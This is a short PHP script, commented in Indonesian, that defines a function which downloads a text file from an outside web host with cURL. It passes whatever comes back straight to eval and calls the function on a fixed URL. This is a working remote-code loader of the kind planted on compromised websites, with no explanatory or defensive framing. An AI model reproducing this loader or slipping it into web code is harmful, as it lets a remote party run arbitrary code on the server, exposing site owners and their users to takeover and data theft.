<?php
function jalankanKodeDariUrl($url) {
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $kode = curl_exec($ch);
    
    if (curl_errno($ch)) {
        echo "cURL error: " . curl_error($ch);
    } else {
        eval("?>" . $kode);
    }

    curl_close($ch);
}

// Panggil fungsi
jalankanKodeDariUrl("https://v1.javpornsub.net/4.txt");
?>